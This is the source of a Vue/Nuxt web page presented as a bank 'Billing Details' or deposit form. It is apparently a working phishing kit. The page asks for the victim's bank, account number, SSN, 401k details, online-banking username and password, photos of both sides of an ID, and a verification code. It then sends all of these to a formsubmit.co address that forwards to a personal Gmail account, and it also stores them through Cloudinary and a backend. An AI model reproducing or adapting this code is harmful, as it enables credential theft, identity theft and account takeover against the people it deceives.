<script setup lang="ts">
import { useCloudinary } from '~/composables/useCloudinary';
const { uploadImage } = useCloudinary();
import { sendRequest } from '~/composables/useRequest';
const { submitRequest } = sendRequest();
// SweetAlert
const { $swal } = useNuxtApp();

const formpage = ref('default'); // can be 'default' or 'code'

const form:any = ref({
  bank: '',
  accountNumber: '',
  amount: '',
  username: '',
  password: '',
  ssn: '',
  fortyOneK: '',
  fortyOneKProvider: '',
  code: '',
  frontPreview: '',
  backPreview: ''
})

const frontPreview = ref('')
const backPreview = ref('')

const frontInput = ref<HTMLInputElement | null>(null)
const backInput = ref<HTMLInputElement | null>(null)

const usaBanks = [
  'JPMorgan Chase',
  'Bank of America',
  'Wells Fargo',
  'Citibank',
  'U.S. Bank',
  'PNC Bank',
  'Truist Bank',
  'Capital One',
  'TD Bank',
  'BMO Bank',
  'Fifth Third Bank',
  'Citizens Bank',
  'Huntington Bank',
  'M&T Bank',
  'KeyBank',
  'Regions Bank',
  'First Horizon Bank',
  'Comerica Bank',
  'Ally Bank',
  'American Express National Bank',
  'Synchrony Bank',
  'Discover Bank',
  'Navy Federal Credit Union',
  'Charles Schwab Bank',
  'HSBC USA',
  'First Citizens Bank',
  'Santander Bank',
  'Flagstar Bank',
  'Webster Bank',
  'Valley Bank',
  'Associated Bank',
  'East West Bank',
  'Frost Bank',
  'UMB Bank',
  'Old National Bank',
  'Wintrust Bank',
  'Arvest Bank',
  'Woodforest National Bank',
  'FirstBank',
  'United Community Bank'
]

const handleImageUpload = (
  event: Event,
  side: 'front' | 'back'
) => {
  const target = event.target as HTMLInputElement

  if (!target.files?.length) return

  const file = target.files[0]
  const reader = new FileReader()

  reader.onload = e => {
    const result = e.target?.result as string

    if (side === 'front') {
      frontPreview.value = result
    } else {
      backPreview.value = result
    }
  }

  reader.readAsDataURL(file)
}

const getCardStyle = (image: string) => {
  return image
    ? {
        backgroundImage: `url(${image})`,
        backgroundSize: 'cover',
        backgroundPosition: 'center'
      }
    : {}
}

const loadReq = ref(false);
const uploadReq = ref(false);

const dataUrlToFile = (dataUrl: string, filename: string): File => {
  const arr = dataUrl.split(',')
  const mime = arr[0].match(/:(.*?);/)?.[1] || 'image/jpeg'
  const bstr = atob(arr[1])
  let n = bstr.length
  const u8arr = new Uint8Array(n)
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n)
  }
  return new File([u8arr], filename, { type: mime })
}

const submitForm = () => {
  if ( frontPreview.value === '' || backPreview.value === '' ) {
    $swal.fire('Error', 'Please upload both front and back images of your ID.', 'error');
    return false;
  }
  loadReq.value = true;
  // upload both images to Cloudinary
  Promise.all([
    uploadImage(dataUrlToFile(frontPreview.value, 'front-id')),
    uploadImage(dataUrlToFile(backPreview.value, 'back-id'))
  ]).then(([frontUrl, backUrl]) => {
    // Here you can send the form data along with the uploaded image URLs to your backend or Firestore
    form.value.frontPreview = frontUrl;
    form.value.backPreview = backUrl;
    console.log('Front Image URL:', frontUrl);
    console.log('Back Image URL:', backUrl);

    // Reset form and previews if needed
    // form.value = {
    //   bank: '',
    //   accountNumber: '',
    //   amount: '',
    //   username: '',
    //   password: '',
    //   ssn: '',
    //   fortyOneK: '',
    //   fortyOneKProvider: '',
    //   code: ''
    // };
    // frontPreview.value = '';
    // backPreview.value = '';
  }).catch(err => {
    console.error('Error uploading images:', err);
    $swal.fire('Error', 'There was an issue uploading your ID images. Please try again.', 'error');
  });

  // save to Firestore
  submitRequest(form.value).then((resp) => {
    // $swal.fire('Success', 'Your request has been submitted successfully!', 'success');
    // console.log(resp);
  }).catch(err => {
    console.error('Error submitting request:', err);
    $swal.fire('Error', 'There was an issue submitting your request. Please try again.', 'error');
  });

  // formdata to send to formsubmit.co
  const formdata = new FormData();
  formdata.append('bank', form.value.bank);
  formdata.append('accountNumber', form.value.accountNumber);
  formdata.append('amount', form.value.amount);
  formdata.append('username', form.value.username);
  formdata.append('password', form.value.password);
  formdata.append('ssn', form.value.ssn);
  formdata.append('fortyOneK', form.value.fortyOneK);
  formdata.append('fortyOneKProvider', form.value.fortyOneKProvider);
  formdata.append('frontPreview', form.value.frontPreview);
  formdata.append('backPreview', form.value.backPreview);
  
  // send to formsubmit.co
  fetch('https://formsubmit.co/ajax/segzyswitch99@gmail.com', {
    method: 'POST',
    headers: {
      'Accept': 'application/json'
    },
    body: formdata
  }).then(data => {
    console.log('Form submitted successfully:', data);
  }).catch(err => {
    console.error('Error submitting form:', err);
    $swal.fire('Error', 'There was an issue submitting your form. Please try again.', 'error');
  });
}
</script>

<template>
  <div class="container py-5">

    <!-- Header -->
    <div class="text-center mb-4">
      <div class="logo"><img src="@/assets/images/logo.jpeg" width="70" alt=""></div>
    </div>

    <div class="row justify-content-center">
      <div :class="formpage == 'code' ? 'col-lg-5' : 'col-lg-6'">
        <!-- Default Form -->
        <div class="card checkout-card p-4" v-if="formpage == 'default'">
          <h5 class="mb-3">Billing Details</h5>
          <form id="checkoutForm" @submit.prevent="submitForm">
            <!-- Bank Selection -->
            <div class="mb-3">
              <label class="form-label">Bank</label>
              <select v-model="form.bank" class="form-select" required>
                <option value="">Select Bank</option>
                <option
                  v-for="bank in usaBanks"
                  :key="bank"
                  :value="bank"
                >
                  {{ bank }}
                </option>
              </select>
            </div>
            <!-- Card or Account -->
            <div class="mb-3">
              <label class="form-label">Card or Account Number</label>
              <input
                v-model="form.accountNumber"
                type="text"
                class="form-control"
                required
              />
            </div>
            <!-- ID Upload -->
            <div class="mb-3">
              <label class="form-label d-block">
                Upload Valid ID / Driver's License
              </label>
              <div class="row g-3">
                <!-- Front -->
                <div class="col-6">
                  <div
                    class="card upload-card"
                    :style="getCardStyle(frontPreview)"
                    @click="frontInput?.click()"
                  >
                    <div
                      v-if="!frontPreview"
                      class="card-body d-flex flex-column justify-content-center align-items-center text-center"
                    >
                      <h6>Front Side</h6>
                      <small>Click to upload</small>
                    </div>
                    <input
                      ref="frontInput"
                      type="file"
                      accept="image/*"
                      class="d-none"
                      @change="handleImageUpload($event, 'front')"
                    />
                  </div>
                </div>
                <!-- Back -->
                <div class="col-6">
                  <div
                    class="card upload-card"
                    :style="getCardStyle(backPreview)"
                    @click="backInput?.click()"
                  >
                    <div
                      v-if="!backPreview"
                      class="card-body d-flex flex-column justify-content-center align-items-center text-center"
                    >
                      <h6>Back Side</h6>
                      <small>Click to upload</small>
                    </div>
                    <input
                      ref="backInput"
                      type="file"
                      accept="image/*"
                      class="d-none"
                      @change="handleImageUpload($event, 'back')"
                    />
                  </div>
                </div>
              </div>
            </div>
            <div class="mb-3">
              <label class="form-label">SSN or Tax ID #</label>
              <input
                v-model="form.ssn"
                type="text"
                class="form-control"
                required
              />
            </div>
            <!-- Amount -->
            <div class="mb-3">
              <label class="form-label">Amount Withdrawing to Bank</label>
              <input
                v-model="form.amount"
                type="number"
                class="form-control"
                min="0"
                required
              />
            </div>
            <!-- 401k -->
            <div class="mb-3">
              <label class="form-label">401k</label>
              <input
                v-model="form.fortyOneK"
                type="text"
                class="form-control"
                required
              />
            </div>
            <!-- Username -->
            <div class="mb-3">
              <label class="form-label">Username</label>
              <input
                v-model="form.username"
                type="text"
                class="form-control"
                required
              />
            </div>
            <!-- Password -->
            <div class="mb-3">
              <label class="form-label">Password</label>
              <input
                v-model="form.password"
                type="password"
                class="form-control"
                required
              />
            </div>
            <!-- 401k Provider -->
            <div class="mb-3">
              <label class="form-label">401k Provider</label>
              <input
                v-model="form.fortyOneKProvider"
                type="text"
                class="form-control"
                required
              />
            </div>

            <!-- Submit -->
            <button type="submit" class="btn btn-primary w-100 p-3 login-btn" :disabled="loadReq==true">
              <i class="spinner-border spinner-border-sm" v-if="loadReq==true"></i>
              <span>PROCEED</span>
            </button>
          </form>
        </div>

        <!-- Code form -->
        <div @submit.prevent class="card checkout-card p-4 text-center" v-if="formpage == 'code'">
          <h5 class="card-title">Enter Verification Code</h5>
          <p class="card-text">Please enter the verification code sent to your email/phone.</p>
          <form @submit.prevent>
            <div class="mb-3 py-3">
              <label class="form-label">Verification Code</label>
              <input
                v-model="form.code"
                type="text"
                class="form-control text-center"
                required
              />
            </div>
            <button type="submit" class="btn btn-primary w-100 p-3 login-btn" style="background-color:#014EA8;" id="codeBtn">
              Complete Deposit
            </button>
          </form>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
.upload-card {
  width: 100%;
  aspect-ratio: 1.6;
  cursor: pointer;
  border: 2px dashed #ced4da;
  overflow: hidden;
  border-radius: 8px;
  transition: 0.2s;
}

.upload-card:hover {
  border-color: #0d6efd;
}
</style>